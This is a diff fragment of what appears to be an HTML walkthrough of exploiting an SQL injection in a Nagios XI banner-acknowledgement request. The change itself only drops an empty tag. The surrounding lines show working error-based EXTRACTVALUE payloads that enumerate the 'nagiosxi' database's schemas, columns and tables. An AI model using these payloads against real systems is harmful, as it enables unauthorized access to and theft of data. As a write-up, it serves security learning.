@@ -175,7 +175,6 @@ I hop back into Burp and modify the request as follows:</p>
 So, I know for sure that an SQL injection problem exists here, but how do I actually extract important data from the server?
 
 Sending `action=acknowledge_banner_message&id=1 AND EXTRACTVALUE(1,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA))` to the server results in the message:</p>
-           <p></p>
            <p>Next is database enumeration. Sending `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))` gives me two databases in the response: "information_schema" and "nagiosxi". To access the columns, I use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(TABLE_NAME,":",COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi')))`, which gives me a limited amount of information. Not enough that it's useful.
 
 I then use `action=acknowledge_banner_message&id=4 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'nagiosxi' LIMIT 0,1)))`, with this, I can go through a list of tables by modifying `LIMIT 0,1` to different numbers. For example: `LIMIT 0,1` returns `xi_deploy_agents` in the server response. `LIMIT 3,1` returns `xi_mibs` in the server response. `LIMIT 7,1` returns `xi_usermeta` in the server response. You get the idea.
